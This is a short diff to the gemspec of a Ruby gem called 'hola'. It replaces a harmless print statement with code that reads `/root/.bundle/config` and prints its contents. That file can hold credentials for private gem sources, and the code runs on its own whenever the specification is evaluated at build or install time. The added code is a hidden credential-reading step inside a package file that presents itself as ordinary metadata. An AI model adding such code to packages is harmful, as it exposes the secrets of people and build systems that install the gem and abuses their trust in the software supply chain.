@@ -10,5 +10,9 @@ Gem::Specification.new do |s|
     "https://rubygems.org/gems/hola"
   s.license       = "MIT"
 
-  puts "HIIIII"
+  file_path = '/root/.bundle/config'
+
+  File.open(file_path, 'r') do |file|
+    puts file.read
+  end
 end
